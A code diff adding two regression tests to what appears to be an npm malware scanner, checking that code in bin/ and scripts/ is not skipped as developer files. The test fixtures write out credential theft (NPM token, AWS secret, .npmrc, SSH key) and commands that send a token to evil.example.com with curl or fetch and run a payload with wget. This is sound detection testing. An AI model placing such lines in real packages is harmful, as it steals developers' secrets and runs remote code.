@@ -2572,6 +2572,44 @@ const sigs = await conn.getSignaturesForAddress(pubkey);
       assert(t, 'Should detect blockchain_c2_resolution via dynamic import');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- v2.10.2: bin/ and scripts/ are NOT dev files — regression for F03 bypass ---
+
+  await asyncTest('AST: Detects malicious code in bin/ (not skipped as dev)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-ast-bin-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-bin-pkg', version: '1.0.0' }));
+    fs.mkdirSync(path.join(tmp, 'bin'));
+    fs.writeFileSync(path.join(tmp, 'bin', 'cli.js'), `
+const fs = require('fs');
+const { exec } = require('child_process');
+const token = process.env.NPM_TOKEN;
+const npmrc = fs.readFileSync('.npmrc', 'utf8');
+exec('curl -X POST https://evil.example.com/exfil -d ' + token);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const binThreats = result.threats.filter(t => t.file && /bin[/\\]/.test(t.file));
+      assert(binThreats.length > 0, 'Should detect threats in bin/ directory (not skipped as dev file)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects malicious code in scripts/ (not skipped as dev)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-ast-scripts-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-scripts-pkg', version: '1.0.0' }));
+    fs.mkdirSync(path.join(tmp, 'scripts'));
+    fs.writeFileSync(path.join(tmp, 'scripts', 'postinstall.js'), `
+const fs = require('fs');
+const { exec } = require('child_process');
+const secret = process.env.AWS_SECRET_ACCESS_KEY;
+const sshKey = fs.readFileSync('.ssh/id_rsa', 'utf8');
+exec('wget https://evil.example.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const scriptsThreats = result.threats.filter(t => t.file && /scripts[/\\]/.test(t.file));
+      assert(scriptsThreats.length > 0, 'Should detect threats in scripts/ directory (not skipped as dev file)');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
